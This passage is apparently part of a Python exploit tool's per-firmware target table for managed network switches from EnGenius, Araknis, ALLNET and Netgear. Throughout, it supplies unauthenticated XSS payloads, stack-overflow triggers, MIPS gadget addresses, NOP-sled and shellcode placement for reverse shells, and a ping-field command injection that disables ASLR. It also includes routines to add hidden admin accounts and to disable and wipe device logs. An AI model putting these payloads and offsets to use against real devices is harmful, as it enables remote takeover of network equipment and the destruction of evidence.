    'vulnerable': True,
    'safe': True
    },
    'sn.captivePortal.login (XSS)': {
    'description':'XSS in "userurl & uamip" (PoC: Count passed XSS)',
    'authenticated': False,
    'response':'xss',
    'Content-Type':False,
    'uri':'/cgi-bin/sn.captivePortal.login?cmd=action',
    'content':'mac=dummy&res=dummy&userurl=<script>alert(XSS);</script>&uamip=<script>alert(XSS);</script>&alertmsg=dummy&called=dummy',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'cpl_logo_ul.cgi': {
    'description':'Unauthenticated upload of "logo_icon". (PoC: Upload invalid file)',
    'authenticated': False,
    'response':'json',
    'Content-Type':False,
    'uri':'/cgi-bin/cpl_logo_ul.cgi',
    'content':'Content-Disposition: filename.png\n------',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'cpl_locallogin.cgi': {
    'description':'Stack overflow in "username/password (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi-bin/cpl_locallogin.cgi?redirecturl=AAAA&userurl=BBBB&loginurl=BBBB',
    'content':'username=admin&password=' + self.random_string(196),
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'sn.captivePortal.login': {
    'description':'Stack overflow in "called", XSS in "userurl & uamip" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi-bin/sn.captivePortal.login?cmd=action',
    'content':'mac=dummy&res=dummy&userurl=dummy&uamip=dummy&alertmsg=dummy&called=' + self.random_string(4100),
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'sn.jrpc.dispatch.cgi': {
    'description':'Stack overflow in "usr, pswrd and method" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi-bin/sn.jrpc.dispatch.cgi',
    'content':'{"id":1, "jsonrpc":"2.0","params":{"usr":"admin","pswrd":"' + self.random_string(288) + '"},"method":"login"}',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'sn.captivePortal.auth': {
    'description':'Stack overflow in "user, chap_chal, chap_pass" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi-bin/sn.captivePortal.auth?user=admin&chap_chal=challenge&chap_pass='+ self.random_string(140),
    'content':'',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    },
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E15C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99851c,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x24840690,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 6,# Should leave as-is (but you can play between 5 - 8)
    'safe': True, # Boa/Hydra restart/watchdog, False = no restart, True = restart
    'vulnerable': True,
    },
    'stack_cgi_add_account': {
    # pt: 0 = no password, 1 = cleartext, 2 = encrypted
    # /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
    'address':0x42D1D4,# Jump one after 'sw $ra'# (address, binary dependent)
    'account':'&na=USERNAME&pt=2&pw=PASSWORD&pwn=PASSWORD&pv=0&op=1&',# Admin, priv 15
    'vulnerable': True,
    },
    'stack_cgi_del_account': {
    # /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
    'address':0x42D1D4,# Jump one after 'sw $ra'# (address, binary dependent)
    'account':'&na=USERNAME&pt=2&pv=0&op=0',#
    'vulnerable': True,#
    },
    'stack_cgi_diag': {
    # /sqfs/home/web/cgi-bin/datajson.cgi;  sn_tracertSet()
    # traceroute
    'web_sys_ping_post': 0x42CB8C,# Jump one after 'sw $ra'# (address, binary dependent)
    'sys_ping_post_cmd':'&ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check #&mh=30&uid=0',
    'sys_ping_post_check':'',
    'verify_uri':'/conf_tmp/check',
    
    'vulnerable': True,#
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_globalSet()
    'log_settings_set':0x4494E8,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
    'log_ramClear':0x44B0C0,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
    'log_fileClear':0x44B0C0,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
    'sys_timeSntp_set':0x42E438,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSntpDel_set()
    'sys_timeSntpDel_set':0x42E438,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_timeSettings_set()
    'sys_timeSettings_set':0x42E438,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'security.cgi',# /sqfs/home/web/cgi-bin/security.cgi; main()
    'query':'nop=nop&usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
    'START':0x100271A0,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x104006A0,# end: You may want to play with this if you dont get it working
    'usr_nop': 987,# NOP sled (shellcode will be tailed)
    'pwd_nop': 69,# filler/garbage (not used for something constructive)
    'align': 0,# Align opcodes in memory
    'stack':False,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    '14044-44104': {
    'template':'EnGenius',# Static for the vendor
    'version':'1.07.22_c1.9.21_181018-0228',# Version / binary dependent stuff
    'model':'EWS1200-28TFP',# Model
    'uri':'https://www.engeniustech.com/engenius-products/managed-poe-network-switch-ews1200-28tfp/',
    'verify': {
    'cpl_locallogin.cgi (XSS)': {
    'description':'XSS in "redirecturl,userurl,loginurl,username,password" (PoC: Count passed XSS)',
    'authenticated': False,
    'response':'xss',
    'Content-Type':False,
    'uri':'/cgi-bin/cpl_locallogin.cgi?redirecturl=<script>alert(XSS);</script>&userurl=<script>alert(XSS);</script>&loginurl=<script>alert(XSS);</script>',
    'content':'username=<script>alert(XSS);</script>&password=<script>alert(XSS);</script>',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'sn.captivePortal.login (XSS)': {
    'description':'XSS in "userurl & uamip" (PoC: Count passed XSS)',
    'authenticated': False,
    'response':'xss',
    'Content-Type':False,
    'uri':'/cgi-bin/sn.captivePortal.login?cmd=action',
    'content':'mac=dummy&res=dummy&userurl=<script>alert(XSS);</script>&uamip=<script>alert(XSS);</script>&alertmsg=dummy&called=dummy',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'cpl_logo_ul.cgi': {
    'description':'Unauthenticated upload of "logo_icon". (PoC: Upload invalid file)',
    'authenticated': False,
    'response':'json',
    'Content-Type':False,
    'uri':'/cgi-bin/cpl_logo_ul.cgi',
    'content':'Content-Disposition: filename.png\n------',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'cpl_locallogin.cgi': {
    'description':'Stack overflow in "username/password (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi-bin/cpl_locallogin.cgi?redirecturl=AAAA&userurl=BBBB&loginurl=BBBB',
    'content':'username=admin&password=' + self.random_string(196),
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'sn.captivePortal.login': {
    'description':'Stack overflow in "called", XSS in "userurl & uamip" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi-bin/sn.captivePortal.login?cmd=action',
    'content':'mac=dummy&res=dummy&userurl=dummy&uamip=dummy&alertmsg=dummy&called=' + self.random_string(4100),
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'sn.jrpc.dispatch.cgi': {
    'description':'Stack overflow in "usr, pswrd and method" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi-bin/sn.jrpc.dispatch.cgi',
    'content':'{"id":1, "jsonrpc":"2.0","params":{"usr":"admin","pswrd":"' + self.random_string(288) + '"},"method":"login"}',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    'sn.captivePortal.auth': {
    'description':'Stack overflow in "user, chap_chal, chap_pass" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi-bin/sn.captivePortal.auth?user=admin&chap_chal=challenge&chap_pass='+ self.random_string(140),
    'content':'',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    },
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E15C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99851c,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x24840690,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 6,# Should leave as-is (but you can play between 5 - 8)
    'safe': True, # Boa/Hydra restart/watchdog, False = no restart, True = restart
    'vulnerable': True,
    },
    'stack_cgi_add_account': {
    # pt: 0 = no password, 1 = cleartext, 2 = encrypted
    # /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
    'address':0x42C334,# Jump one after 'sw $ra'# (address, binary dependent)
    'account':'&na=USERNAME&pt=2&pw=PASSWORD&pwn=PASSWORD&pv=0&op=1&',# Admin, priv 15
    'vulnerable': True,
    },
    'stack_cgi_del_account': {
    # /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
    'address':0x42C334,# Jump one after 'sw $ra'# (address, binary dependent)
    'account':'&na=USERNAME&pt=2&pv=0&op=0',#
    'vulnerable': True,#
    },
    'stack_cgi_diag': {
    # /sqfs/home/web/cgi-bin/datajson.cgi;  sn_tracertSet()
    # traceroute
    'web_sys_ping_post': 0x42BCEC,# Jump one after 'sw $ra'# (address, binary dependent)
    'sys_ping_post_cmd':'&ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check #&mh=30&uid=0',
    'sys_ping_post_check':'',
    'verify_uri':'/conf_tmp/check',
    
    'vulnerable': True,#
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_globalSet()
    'log_settings_set':0x448008,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
    'log_ramClear':0x449BE0,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
    'log_fileClear':0x449BE0,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
    'sys_timeSntp_set':0x42D598,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
    'sys_timeSntpDel_set':0x42D598,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
    'sys_timeSettings_set':0x42D598,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'security.cgi',# /sqfs/home/web/cgi-bin/security.cgi; main()
    'query':'nop=nop&usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
    'START':0x100271A0,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x104006A0,# end: You may want to play with this if you dont get it working
    'usr_nop': 987,# NOP sled (shellcode will be tailed)
    'pwd_nop': 69,# filler/garbage (not used for something constructive)
    'align': 0,# Align opcodes in memory
    'stack':False,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # Araknis Networks
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : Yes
    # Del /mntlog/flash.log  : Yes
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '8028-89928': {
    'template':'Araknis',# Static for the vendor
    'version':'1.2.00_171225-1618',# Version / binary dependent stuff
    'model':'AN-310-SW-16-POE',# Model
    'uri':'http://araknisnetworks.com/',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40E04C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99851c,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x24840470,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 6,# Should leave as-is (but you can play between 5 - 8)
    'safe': False, # Boa/Hydra restart/watchdog, False = no restart, True = restart
    'vulnerable': True,
    },
    'stack_cgi_diag': {
    # /sqfs/home/web/cgi-bin/datajson.cgi;  sn_tracertSet()
    # traceroute
    'web_sys_ping_post': 0x42A494,# Jump one after 'sw $ra'# (address, binary dependent)
    'sys_ping_post_cmd':'&ip=127.0.0.1 ;echo 0 > /proc/sys/kernel/randomize_va_space; cat /proc/sys/kernel/randomize_va_space > /tmp/conf_tmp/check #&mh=30&session_uid=0&uid=0',
    'sys_ping_post_check':'',
    'verify_uri':'/conf_tmp/check',
    
    'vulnerable': True,#
    },
    'stack_cgi_add_account': {
    # /sqfs/home/web/cgi/set.cgi;  sn_EncrypOnly_user_mngSet()
    'address':0x4303B4,# Jump one after 'sw $ra'# (address, binary dependent)
    'account':'&na=USERNAME&pw=PASSWORD&pv=0&op=1&',# Admin, priv 15
    'vulnerable': True,
    },
    'stack_cgi_del_account': {
    # /sqfs/home/web/cgi/set.cgi;  sn_user_mngSet()
    'address':0x42ADB8,# Jump one after 'sw $ra'# (address, binary dependent)
    'account':'&na=USERNAME&pw=&pv=0&op=0',#
    'vulnerable': True,# user
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_globalSet()
    'log_settings_set':0x44DBD8,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
    'log_ramClear':0x44FC88,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_log_show_Set()
    'log_fileClear':0x44FC88,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
    'sys_timeSntp_set':0x42BAE4,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
    'sys_timeSntpDel_set':0x42BAE4,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi-bin/datajson.cgi; sn_sys_timeSet()
    'sys_timeSettings_set':0x42BAE4,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'security.cgi',# /sqfs/home/web/cgi-bin/security.cgi; main()
    # We need these to push NOP and shellcode on higher heap addresses to avoid 0x00
    'query': (self.random_string(1) +'=' + self.random_string(1) +'&') * 110 + 'usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
    #'query':'a=a&' * 110 + 'usr=admin&pswrd=_PWDNOP_RA_START&shellcode=_USRNOP_SHELLCODE',
    'START':0x10010104,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP': 0x10600604,# end: You may want to play with this if you dont get it working
    'usr_nop': 987,# NOP sled (shellcode will be tailed)
    'pwd_nop': 69,# filler/garbage (not used for something constructive)
    'align': 0,# Align opcodes in memory
    'stack':False,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # ALLNET GmbH Computersysteme
    # JSON based SG8xxx
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : Yes
    # Del /mntlog/flash.log  : Yes
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '752-76347': {
    'model':'ALL-SG8208M',
    'template':'ALLNET_JSON',# Static for the vendor
    'version':'2.2.1',# Version / binary dependent stuff
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40C4FC,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f998528,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x248498dc,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    
    'vulnerable': True,
    },
    'stack_cgi_diag': {
    'vulnerable': False,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': {
    'vulnerable': False,
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi/set.cgi; cgi_log_settings_set()
    'log_settings_set':0x412ADC,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_ramClear_set()
    'log_ramClear':0x412A24,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_log_fileClear_set()
    'log_fileClear':0x412A24,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSntp_set':0x40FA74,# Jump one after 'sw $ra'# Set SNTP Server (Inject RCE)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSntpDel_set':0x40FA74,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi/set.cgi; cgi_sys_time_set()
    'sys_timeSettings_set':0x40FA74,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable': True,
    },
    'heack_cgi_shell': {
    'cgi':'set.cgi',# /sqfs/home/web/cgi/set.cgi; cgi_home_loginAuth_set()
    'START':0x7ffeff04,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x7fc60000,# end: You may want to play with this if you dont get it working
    'usr_nop': 64,# NOP sled (shellcode will be tailed)
    'pwd_nop': 77,# filler/garbage (not used for something constructive)
    'align': 3,# Align opcodes in memory
    'stack':True,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # ALLNET GmbH Computersysteme
    # Not JSON based SG8xxx
    # (Traces in this image: 3One Data Communication, Saitian, Sangfor, Sundray, Gigamedia, GetCK, Hanming Technology, Wanbroad, Plexonics, Mach Power, Gigamedia, TG-NET)
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : Yes
    # Del /var/log/flash.log : No
    # Del /mntlog/flash.log  : No
    # Add credentials        : Yes
    # Del credentials        : Yes
    #
    '222-50100': {
    'template':'ALLNET',# Static for the vendor
    'version':'3.1.1-R3-B1',# Version / binary dependent stuff
    'model':'ALL-SG8310PM',# Model
    'uri':'https://www.allnet.de/en/allnet-brand/produkte/switches/entry-line-layer2-smart-managed-unamanged/poe-switches0/p/allnet-all-sg8310pm-smart-managed-8-port-gigabit-4x-hpoe',
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x40C74C,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99851c,# la $t9, system) # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x2484029c,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_diag': {
    'vulnerable': False,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_log': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_setting_post()
    'log_settings_set':0x46BB04,# Jump one after 'sw $ra'# Disable Logging (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_ramClear':0x46F240,# Jump one after 'sw $ra'# Clean RAM log (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi;  web_log_file_del()
    'log_fileClear':0x46F240,# Jump one after 'sw $ra'# Clean FILE log (address, binary dependent)
    'vulnerable': True,
    },
    'stack_cgi_sntp': {
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntp_set':0x426724,# Jump one after 'sw $ra'# Set SNTP Server (Inject CMD)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_sntp_post()
    'sys_timeSntpDel_set':0x426724,# Jump one after 'sw $ra'# Delete (address, binary dependent)
    # /sqfs/home/web/cgi-bin/dispatcher.cgi; web_sys_time_post()
    'sys_timeSettings_set':0x424D28,# Jump one after 'sw $ra'# Enable/Disable (address, binary dependent)
    'vulnerable':False,
    },
    
    # Interesting when there is a fresh heap with 0x00's (4 x 0x00 == MIPS NOP),
    # and to fill wider area with sending '&%8f%84%01=%8f%84%80%18' where:
    #
    # NOP's
    # '24%04%FF=' : '=' will be replaced with 0x00, li $a0, 0xFFFFFF00
    # '%24%04%FF%FF' : li $a0, 0xFFFFFFFF
    'heack_cgi_shell': {
    'cgi':'dispatcher.cgi',# /sqfs/home/web/cgi-bin/dispatcher.cgi; main()
    'query':'username='+ self.random_string(112) +'_RA_START&password='+ self.random_string(80) +'&login=1'+ ('&%24%04%FF=%24%04%FF%FF' * 50) +'_SHELLCODE',
    'START':0x10010104,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP' :0x10600604,# end: You may want to play with this if you dont get it working
    'usr_nop': 28,# NOP sled (shellcode will be tailed)
    'pwd_nop': 20,# filler/garbage (not used for something constructive)
    'align': 0,# Align opcodes in memory
    'stack':False,# NOP and shellcode lays on: True = stack, False = Heap
    'vulnerable': True,
    },
    },
    },
    
    #
    # Netgear inc.
    #
    # CGI Reverse Shell      : Yes
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : No (logging do not exist)
    # Del /var/log/flash.log : No (logging do not exist)
    # Del /mntlog/flash.log  : No (logging do not exist)
    # Add credentials        : No (Single account only)
    # Del credentials        : No (Single account only)
    #
    '609-31457': {
    'template':'Netgear',# Static for the vendor
    'model':'GS750E ProSAFE Plus Switch',
    'uri':'https://www.netgear.com/support/product/gs750e.aspx',
    'version':'1.0.0.22',# Version / binary dependent stuff
    'login': {
    'encryption':'caesar',
    'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'query':'{"_ds=1&password=PASSWORD&err_flag=0&err_msg=&submt=&_de=1":{}}',
    },
    'verify': {
    'set.cgi': {
    'description':'Stack overflow in "password" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&password=' + self.random_string(320) + '&err_flag=0&err_msg=&submt=&_de=1":{}}',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    },
    'exploit': {
    'heack_hydra_shell': {
    # /sqfs/bin/boa; embedparse()
    'gadget': 0x4102F8,# Gadget: 'addu $v0,$gp ; jr $v0' (address, binary dependent)
    # /sqfs/bin/boa; read_body();
    'system': 0x8f9984fc,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x24840c6c,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 7,# Should leave as-is (but you can play between 5 - 8)
    'vulnerable': True,
    },
    'stack_cgi_diag': {
    'vulnerable': False,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    'stack_cgi_log': {
    'vulnerable': False,
    },
    #
    # Interesting, by adding 0xc1c1c1c1 to START/STOP, remote end will decode to our original START/STOP (including 0x00) =]
    #
    'heack_cgi_shell': {
    'description':'Stack overflow in "password" (PoC: reverse shell)',
    'authenticated': False,
    'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'logout_uri':'/cgi/set.cgi?cmd=home_logout',
    'cgi':'set.cgi',# /sqfs/home/web/cgi-bin/security.cgi; main()
    'START':0x10001210,# start: Stack overflow RA, used for searching NOP sled by blind jump
    'STOP':0x10006210,# end: You may want to play with this if you dont get it working
    'usr_nop': 50,# NOP sled (shellcode will be tailed)
    'pwd_nop': 79,# filler/garbage (not used for something constructive)
    'align': 0,# Align opcodes in memory
    'stack':False,# NOP and shellcode lays on: True = stack, False = Heap
    'query':'{"_ds=1&password=' + self.random_string(316) + '_RA_START&shellcode=_USRNOP_SHELLCODE&_de=1":{}}',
    'workaround':False,# My LAB workaround
    'vulnerable': True,
    'safe': True
    
    
    
    },
    },
    },
    
    #
    # Netgear inc.
    #
    # Note:
    # 'username' is vulnerable for stack overflow
    # 'pwd' use 'encode()' and not vulnerable for stack overflow (so we cannot jump with 'buffer method'...)
    # Boa/Hydra 'getFdStr()' loop modified, original xploit dont work (0x00 are now ok), weird 'solution' to have $t9 loaded with JMP in 'fwrite()'
    # 'hash=<MD5>' tailing all URI's
    #
    # CGI Reverse Shell      : No
    # Boa/Hydra reverse shell: Yes
    # Del /var/log/ram.log   : No
    # Del /var/log/flash.log : No
    # Del /mntlog/flash.log  : No
    # Add credentials        : No
    # Del credentials        : No
    #
    '639-98866': {
    'template':'Netgear',# Static for the vendor
    'model':'GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP',
    'uri':'https://kb.netgear.com/000060184/GS728TPv2-GS728TPPv2-GS752TPv2-GS752TPP-Firmware-Version-6-0-0-45',
    'version':'6.0.0.45',# Version / binary dependent stuff
    'info_leak':False,
    'hash_uri':True,# tailed 'hash=' md5 hashed URI as csrf token
    'login': {
    'encryption':'encode',
    'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'query':'{"_ds=1&username=USERNAME&pwd=PASSWORD&err_flag=0&err_msg=&submt=&_de=1":{}}',
    },
    'verify': {
    'set.cgi': {
    'description':'Stack overflow in "username" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username='+ self.random_string(100) +'&pwd=NOP&err_flag=0&err_msg=&submt=&_de=1":{}}',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    },
    'exploit': {
    'heack_hydra_shell': {
    #
    'gadget': 0x45678C,# Direct heap address for NOP slep and shellcode
    # /sqfs/bin/boa; read_body();
    'system': 0x8f99853c,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
    'handler': 0x2484ae5c,# addiu $a0, (.ascii "handler -c boa &" - 0x430000) # (opcode, binary dependent)
    'v0': 6,# Should leave as-is (but you can play between 5 - 8)
    'safe': False
    },
    'stack_cgi_diag': {
    'vulnerable': False,
    },
    'stack_cgi_add_account': {
    'vulnerable': False,
    },
    'stack_cgi_del_account': { #
    'vulnerable': False,
    },
    },
    },
    
    '639-73124': {
    'template':'Netgear',# Static for the vendor
    'model':'GS728TPv2, GS728TPPv2, GS752TPv2, GS752TPP',
    'uri':'https://www.netgear.com/support/product/GS752TPv2#Firmware%20Version%206.0.0.37',
    'version':'6.0.0.37',# Version / binary dependent stuff
    'info_leak':False,
    'hash_uri':True,# tailed 'hash=' md5 hashed URI as csrf token
    'login': {
    'encryption':'encode',
    'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'query':'{"_ds=1&username=USERNAME&pwd=PASSWORD&err_flag=0&err_msg=&submt=&_de=1":{}}',
    },
    'verify': {
    'set.cgi': {
    'description':'Stack overflow in "username" (PoC: crash CGI)',
    'authenticated': False,
    'response':'502',
    'Content-Type':False,
    'uri':'/cgi/set.cgi?cmd=home_loginAuth',
    'content':'{"_ds=1&username='+ self.random_string(100) +'&pwd=NOP&err_flag=0&err_msg=&submt=&_de=1":{}}',
    'check_uri':False,
    'content_check':False,
    'vulnerable': True,
    'safe': True
    },
    },
    'exploit': {
    'heack_hydra_shell': {
    #
    'gadget': 0x45778C,# Direct heap address for NOP slep and shellcode
    # /sqfs/bin/boa; read_body();
    'system': 0x8f998538,# la $t9, system # opcode, binary dependent
    # /sqfs/bin/boa; read_body();
